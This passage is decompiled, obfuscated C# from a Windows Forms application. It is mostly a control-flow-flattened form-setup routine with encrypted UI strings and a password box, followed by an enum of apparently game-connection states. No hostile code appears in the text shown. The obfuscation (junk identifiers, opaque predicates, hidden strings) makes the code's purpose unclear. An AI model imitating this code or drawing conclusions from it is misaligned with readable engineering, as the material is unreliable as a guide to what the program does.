        num1 = 120;
        continue;
label_126:
        this.regComparator.Enabled = false;
        num1 = 40;
        continue;
label_127:
        this.m_Test.SortMode = DataGridViewColumnSortMode.Automatic;
        num1 = 267;
        continue;
label_128:
        this.recordComparator.AutoSizeMode = DataGridViewAutoSizeColumnMode.Fill;
        this.recordComparator.DividerWidth = 1;
        num1 = 177;
        continue;
label_130:
        this._Issuer.MultiSelect = false;
        num1 = 124;
        continue;
label_131:
        this._ResolverComparator.Name = RoleValueFilter.RestartVisitor(4290);
        num1 = 92;
        continue;
label_132:
        this._Issuer.RowHeadersWidthSizeMode = DataGridViewRowHeadersWidthSizeMode.DisableResizing;
        num1 = 173;
        continue;
label_134:
        this._Rules.Location = new Point(423, 336);
        this._Rules.Name = RoleValueFilter.RestartVisitor(4994);
        num1 = 220;
        continue;
label_135:
        this.m_Exception.AllowUserToAddRows = false;
        this.m_Exception.AllowUserToDeleteRows = false;
        this.m_Exception.ColumnHeadersHeightSizeMode = DataGridViewColumnHeadersHeightSizeMode.AutoSize;
        num1 = 247;
        continue;
label_137:
        this._PublisherComparator.Click += new EventHandler(this.CreateComparator);
        num1 = 86;
        continue;
label_138:
        this._ContextComparator.AutoSizeMode = DataGridViewAutoSizeColumnMode.None;
        this._ContextComparator.HeaderText = RoleValueFilter.RestartVisitor(4322);
        num1 = 182;
        continue;
label_142:
        this._Broadcaster.Name = RoleValueFilter.RestartVisitor(4200);
        this._Broadcaster.Size = new Size(195, 23);
        num1 = 78;
        continue;
label_145:
        this.global.TabIndex = 12;
        num1 = 129;
        continue;
label_146:
        this._ContextComparator.Name = RoleValueFilter.RestartVisitor(4352);
        num1 = 202;
        continue;
label_148:
        this.watcher.Name = RoleValueFilter.RestartVisitor(3596);
        num1 = 97;
        continue;
label_149:
        this.m_ValueComparator.Multiline = true;
        num1 = 206;
        continue;
label_150:
        this._Rules.TabStop = false;
        num1 = 55;
        continue;
label_151:
        this.advisor.Click += new EventHandler(this.RateComparator);
        this._Printer.Location = new Point(278, 15);
        num1 = 151;
        continue;
label_152:
        this.m_Product.Size = new Size(122, 20);
        num1 = 289;
        continue;
label_154:
        this._Parameter.Size = new Size(59, 13);
        num1 = 146;
        continue;
label_155:
        this._Issuer.AllowUserToDeleteRows = false;
        this._Issuer.ColumnHeadersHeightSizeMode = DataGridViewColumnHeadersHeightSizeMode.AutoSize;
        num1 = 30;
        continue;
label_156:
        this._Producer = new GroupBox();
        this.m_Exception = new DataGridView();
        this.recordComparator = new DataGridViewTextBoxColumn();
        num1 = (int) sbyte.MaxValue;
        continue;
label_157:
        this._Producer.TabIndex = 3;
        num1 = 28;
        continue;
label_159:
        this.m_Creator.Size = new Size(712, 22);
        num1 = 161;
        continue;
label_160:
        this.regComparator.Location = new Point(7, 19);
        this.regComparator.Name = RoleValueFilter.RestartVisitor(5484);
        num1 = 113;
        continue;
label_161:
        this.global.Value = new Decimal(new int[4]
        {
          4445,
          0,
          0,
          0
        });
        this.m_Service.Location = new Point(631, 15);
        num1 = 39;
        continue;
label_162:
        this._Rules.TabIndex = 5;
        num1 = 156;
        continue;
label_163:
        this._Getter.Text = RoleValueFilter.RestartVisitor(2624);
        this.dic.Controls.Add((Control) this.watcher);
        num1 = 178;
        continue;
label_165:
        this.stubComparator.TabStop = false;
        num1 = 29;
        continue;
label_166:
        this.m_Initializer.Text = RoleValueFilter.RestartVisitor(5188);
        this._Code.Location = new Point(229, 17);
        num1 = 85;
        continue;
label_167:
        this._Code.Name = RoleValueFilter.RestartVisitor(5228);
        this._Code.Size = new Size(51, 23);
        this._Code.TabIndex = 3;
        this._Code.Text = RoleValueFilter.RestartVisitor(5260);
        this._Code.UseVisualStyleBackColor = true;
        this._Code.Click += new EventHandler(this.ComputeComparator);
        this.m_Composer.AutoSize = true;
        this.m_Composer.Location = new Point(130, 20);
        num1 = 68;
        continue;
label_169:
        this._Setter.Text = RoleValueFilter.RestartVisitor(2624);
        this._Task.AutoSize = true;
        num1 = 225;
        continue;
label_170:
        this.advisor.Text = RoleValueFilter.RestartVisitor(3754);
        this.advisor.UseVisualStyleBackColor = true;
        num1 = 266;
        continue;
label_172:
        this._Rules = new GroupBox();
        num1 = 179;
        continue;
label_177:
        ((ISupportInitialize) this.m_Mapper).BeginInit();
        num1 = 175;
        continue;
label_179:
        this.m_Composer = new RadioButton();
        this._Wrapper = new RadioButton();
        this.m_Writer = new RadioButton();
        num1 = 61;
        continue;
label_182:
        this.specification.Click += new EventHandler(this.DeleteComparator);
        this._Setter.AutoSize = true;
        this._Setter.Location = new Point(39, 19);
        num1 = 234;
        continue;
label_185:
        this.m_Creator.TabIndex = 0;
        num1 = 184;
        continue;
label_186:
        this.dic.Controls.Add((Control) this.global);
        this.dic.Controls.Add((Control) this.m_Service);
        this.dic.Controls.Add((Control) this.advisor);
        num1 = 64;
        continue;
label_187:
        this.m_Test.AutoSizeMode = DataGridViewAutoSizeColumnMode.ColumnHeader;
        num1 = 54;
        continue;
label_188:
        this._Parameter.Name = RoleValueFilter.RestartVisitor(3804);
        num1 = 95;
        continue;
label_189:
        this.m_Proc.ReadOnly = true;
        num1 = 263;
        continue;
label_190:
        this._Producer.Location = new Point(423, 0);
        this._Producer.Name = RoleValueFilter.RestartVisitor(4370);
        this._Producer.Size = new Size(286, 168);
        num1 = 37;
        continue;
label_193:
        this.stubComparator.ResumeLayout(false);
        num1 = 254;
        continue;
label_198:
        this.m_Writer.TabIndex = 0;
        num1 = 142;
        continue;
label_199:
        this.watcher.AutoSize = true;
        num1 = 250;
        continue;
label_200:
        this._Setter.Name = RoleValueFilter.RestartVisitor(5098);
        this._Setter.Size = new Size(16, 13);
        num1 = 167;
        continue;
label_201:
        this.Controls.Add((Control) this.m_Initializer);
        this.Controls.Add((Control) this._Rules);
        this.Controls.Add((Control) this._Producer);
        num1 = 66;
        continue;
label_202:
        this.prototypeComparator.Location = new Point(176, 306);
        num1 = 69;
        continue;
label_204:
        this.Controls.Add((Control) this.m_Creator);
        num1 = 214;
        continue;
label_205:
        this._Task = new Label();
        num1 = 183;
        continue;
label_208:
        this.m_Expression = new Button();
        num1 = 296;
        continue;
label_210:
        this._Base.Size = new Size(0, 13);
        this._Base.TabIndex = 7;
        num1 = 155;
        continue;
label_211:
        this.m_Mapper.ReadOnly = true;
        this.m_Mapper.RowHeadersVisible = false;
        num1 = 211;
        continue;
label_212:
        this.m_Initializer.Name = RoleValueFilter.RestartVisitor(5152);
        num1 = 56;
        continue;
label_213:
        this.order.Size = new Size(416, 443);
        this.order.TabIndex = 2;
        num1 = 117;
        continue;
label_218:
        this._Issuer.SelectionMode = DataGridViewSelectionMode.FullRowSelect;
        num1 = 195;
        continue;
label_219:
        this.m_Expression.Text = RoleValueFilter.RestartVisitor(4120);
        num1 = 74;
        continue;
label_221:
        this.regComparator.Text = "";
        num1 = 248;
        continue;
label_222:
        this.m_Mapper.Name = RoleValueFilter.RestartVisitor(4752);
        num1 = 126;
        continue;
label_223:
        this.SuspendLayout();
        num1 = 49;
        continue;
label_227:
        this.watcher.Size = new Size(94, 17);
        num1 = 106;
        continue;
label_228:
        this.advisor.Location = new Point(553, 15);
        num1 = 278;
        continue;
label_229:
        this.m_Proc.Resizable = DataGridViewTriState.True;
        num1 = 277;
        continue;
label_230:
        this._Printer.Name = RoleValueFilter.RestartVisitor(3770);
        this._Printer.PasswordChar = '*';
        this._Printer.Size = new Size(101, 20);
        num1 = 166;
        continue;
label_232:
        this._Policy = new Label();
        num1 = 181;
        continue;
label_240:
        this.m_Composer.Name = RoleValueFilter.RestartVisitor(5274);
        num1 = 180;
        continue;
label_241:
        this._Tests = (IContainer) new Container();
        num1 = 9;
        continue;
label_242:
        this._Manager.ResumeLayout(false);
        num1 = 38;
        continue;
label_245:
        this.m_Expression.TabIndex = 0;
        num1 = 275;
        continue;
label_248:
        this._RegistryComparator.ReadOnly = true;
        num1 = 282;
        continue;
label_249:
        this._PublisherComparator.TabIndex = 4;
        this._PublisherComparator.Text = RoleValueFilter.RestartVisitor(5548);
        num1 = 199;
        continue;
label_252:
        this._Producer.ResumeLayout(false);
        ((ISupportInitialize) this.m_Exception).EndInit();
        num1 = 160;
        continue;
label_253:
        this.m_ValueComparator.Location = new Point(6, 245);
        this.m_ValueComparator.MaxLength = 100;
        num1 = 33;
        continue;
label_254:
        this._Wrapper.Text = RoleValueFilter.RestartVisitor(5358);
        this._Wrapper.UseVisualStyleBackColor = true;
        num1 = (int) byte.MaxValue;
        continue;
label_256:
        this.stubComparator.PerformLayout();
        num1 = 50;
        continue;
label_257:
        ((ISupportInitialize) this._Issuer).EndInit();
        num1 = 203;
        continue;
label_258:
        this._PublisherComparator.Location = new Point(60, 301);
        this._PublisherComparator.Name = RoleValueFilter.RestartVisitor(5516);
        this._PublisherComparator.Size = new Size(72, 23);
        num1 = 285;
        continue;
label_261:
        this.m_Test.HeaderText = RoleValueFilter.RestartVisitor(4852);
        num1 = 238;
        continue;
label_263:
        this.stubComparator = new GroupBox();
        num1 = 96;
        continue;
label_266:
        this.m_Test.Width = 67;
        num1 = 62;
        continue;
label_267:
        this._Issuer.Columns.AddRange((DataGridViewColumn) this._ResolverComparator, (DataGridViewColumn) this._RegistryComparator, (DataGridViewColumn) this._ContextComparator);
        this._Issuer.Enabled = false;
        this._Issuer.Location = new Point(9, 375);
        num1 = 91;
        continue;
label_269:
        this._ResolverComparator.ReadOnly = true;
        num1 = 172;
        continue;
label_270:
        this._Collection = new Label();
        num1 = 280;
        continue;
label_272:
        this._FieldComparator.Tick += new EventHandler(this.CalculateComparator);
        this.AutoScaleDimensions = new SizeF(6f, 13f);
        num1 = 47;
        continue;
label_273:
        this._RegistryComparator.DividerWidth = 1;
        num1 = 59;
        continue;
label_274:
        this.global = new NumericUpDown();
        num1 = 170;
        continue;
label_275:
        this.m_Initializer = new GroupBox();
        num1 = 193;
        continue;
label_276:
        this._Rules.SuspendLayout();
        this.m_Initializer.SuspendLayout();
        this.stubComparator.SuspendLayout();
        num1 = 133;
        continue;
label_277:
        this.dic.Controls.Add((Control) this._Policy);
        num1 = 189;
        continue;
label_279:
        this.m_Writer.Text = RoleValueFilter.RestartVisitor(5408);
        this.m_Writer.UseVisualStyleBackColor = true;
        num1 = 237;
        continue;
label_283:
        this.global.Name = RoleValueFilter.RestartVisitor(3644);
        num1 = 152;
        continue;
label_284:
        this.m_Instance.Name = RoleValueFilter.RestartVisitor(3906);
        num1 = 290;
        continue;
label_285:
        this._Broadcaster.Location = new Point(215, 351);
        num1 = 10;
        continue;
label_291:
        this._Rules.Controls.Add((Control) this.specification);
        this._Rules.Controls.Add((Control) this._Setter);
        this._Rules.Controls.Add((Control) this._Task);
        num1 = 208;
        continue;
label_295:
        this.order.SuspendLayout();
        ((ISupportInitialize) this._Issuer).BeginInit();
        num1 = 118;
        continue;
label_302:
        this.m_Mapper.SelectionMode = DataGridViewSelectionMode.CellSelect;
        this.m_Mapper.Size = new Size(274, 131);
        num1 = 108;
      }
label_281:;
    }

    internal static bool NewInfo() => true;

    internal static bool StopInfo() => false;

    private enum InfoComparatorConsumer
    {
      DECONNECTED,
      CONNECTED,
      LOGED,
      PLAYING,
      WAITING,
      PLAYING_COMPUTER,
    }

    private class ObserverAnnotationState
    {
      public PoolFieldMessage poolComparator;
      public PoolFieldMessage _DecoratorComparator;
      public bool m_ClassComparator;
      public SqlParameterType m_SerializerComparator;

      [MethodImpl(MethodImplOptions.NoInlining)]
      public ObserverAnnotationState(
        PoolFieldMessage reference,
        PoolFieldMessage result,
        SqlParameterType proc,
        bool readselection2)
      {
        int num1 = 0;
        if (GetterStrategyConnector.ObserverAnnotationState.StartInfo())
          ;
        while (true)
        {
          int num2;
          switch (num1)
          {
            case 0:
              UtilsContextLicense.ListWorker();
              if (true)
              {
                num1 = 4;
                continue;
              }
              goto label_11;
            case 1:
            case 4:
              // ISSUE: explicit constructor call
              base.\u002Ector();
              num2 = 7;
              break;
            case 2:
            case 3:
              this.poolComparator = reference;
              goto case 5;
            case 5:
              this.m_SerializerComparator = proc;
              if (!GetterStrategyConnector.ObserverAnnotationState.StartInfo())
              {
                num1 = 6;
                continue;
              }
              goto case 6;
            case 6:
              this.m_ClassComparator = readselection2;
              num1 = 8;
              continue;
            case 7:
              this._DecoratorComparator = result;
              if (true)
              {
                num1 = 2;
                continue;
              }
              goto case 1;
            case 8:
              goto label_1;
            default:
              num2 = 5;
              break;
          }
          num1 = num2;
        }
label_1:
        return;
label_11:;
      }

      internal static bool ValidateInfo() => true;

      internal static bool StartInfo() => false;
    }
  }
}
